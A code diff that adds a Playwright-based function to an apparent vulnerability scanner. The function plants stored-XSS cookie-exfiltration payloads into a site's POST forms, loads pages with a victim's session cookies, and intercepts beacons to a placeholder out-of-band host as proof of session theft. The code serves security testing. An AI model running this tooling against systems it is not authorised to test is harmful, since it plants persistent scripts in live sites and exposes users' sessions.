@@ -257,6 +257,101 @@ export async function proveStoredXss({
 }
 
 /**
+ * Stored-XSS → SESSION-THEFT proof (headless-assisted). As the ATTACKER, plant a cookie-exfil payload
+ * into each text field of each POST form. Then render candidate pages AS THE VICTIM, with the victim's
+ * real session cookies set on the browser context (so document.cookie can read them — unless HttpOnly).
+ * If the stored payload executes in the victim's page it beacons document.cookie to the sentinel OOB
+ * host; we INTERCEPT that outbound request (and abort it, so nothing actually leaves) and return its URL.
+ * The engine's zero-FP core (confirmSessionTheft) then confirms theft only if the beacon carried the
+ * victim's OWN session token. Returns the intercepted beacon URLs, or null if Playwright is unavailable.
+ */
+export async function proveXssExfil({
+  origin,
+  forms = [],
+  pages = [],
+  attackerHeaders = {},
+  victimCookies = [],
+  payload,
+  oobHost = 'sx-exfil.invalid',
+  timeoutMs = 9000,
+} = {}) {
+  if (!payload || !victimCookies.length) return [];
+  let chromium;
+  try {
+    ({ chromium } = await import('playwright'));
+  } catch {
+    return null;
+  }
+  let browser;
+  try {
+    browser = await chromium.launch({ headless: true });
+  } catch {
+    return null;
+  }
+  const orig = (() => {
+    try {
+      return new URL(origin).origin;
+    } catch {
+      return null;
+    }
+  })();
+  try {
+    // 1) ATTACKER plants the exfil payload into each non-secret text field of each POST form.
+    let planted = 0;
+    for (const form of forms) {
+      if (!form?.url || (form.method || 'post').toLowerCase() !== 'post' || !Array.isArray(form.params)) continue;
+      const fields = form.params.filter((p) => !/csrf|token|authenticity|_token|xsrf|state|nonce|pass|pwd/i.test(p));
+      if (!fields.length) continue;
+      const hidden = await hiddenInputs(form.url, attackerHeaders);
+      const bodyObj = { ...hidden };
+      for (const p of form.params) bodyObj[p] = fields.includes(p) ? payload : `sx${p}`;
+      try {
+        await fetch(form.url, {
+          method: 'POST',
+          headers: { ...attackerHeaders, 'content-type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams(bodyObj).toString(),
+        });
+        planted++;
+      } catch {}
+    }
+    if (!planted) return [];
+
+    // 2) VICTIM renders candidate pages with their real session cookies; intercept the beacon.
+    const observations = [];
+    const ctx = await browser.newContext({ ignoreHTTPSErrors: true });
+    try {
+      await ctx.addCookies(victimCookies);
+    } catch {}
+    await ctx.route('**/*', (route) => {
+      let host = '';
+      try {
+        host = new URL(route.request().url()).hostname;
+      } catch {}
+      if (host === oobHost) {
+        observations.push(route.request().url()); // captured the exfil beacon
+        return route.abort(); // never actually let it leave the browser
+      }
+      return route.continue();
+    });
+    const page = await ctx.newPage();
+    page.on('pageerror', () => {});
+    const pageList = [...new Set([...pages, ...forms.map((f) => f?.url).filter(Boolean), `${orig}/`])].slice(0, 25);
+    for (const pg of pageList) {
+      try {
+        await page.goto(pg, { waitUntil: 'load', timeout: timeoutMs });
+        await page.waitForTimeout(250);
+      } catch {}
+    }
+    await ctx.close().catch(() => {});
+    return observations;
+  } catch {
+    return [];
+  } finally {
+    await browser.close().catch(() => {});
+  }
+}
+
+/**
  * DOM-based XSS execution-proof. Inject an execution payload into the URL FRAGMENT (which the server
  * never sees) and the query, render in a real browser, and confirm a nonce callback. To attribute it
  * to a CLIENT-SIDE sink (true DOM XSS) and not double-report server-reflected XSS, a hit only counts
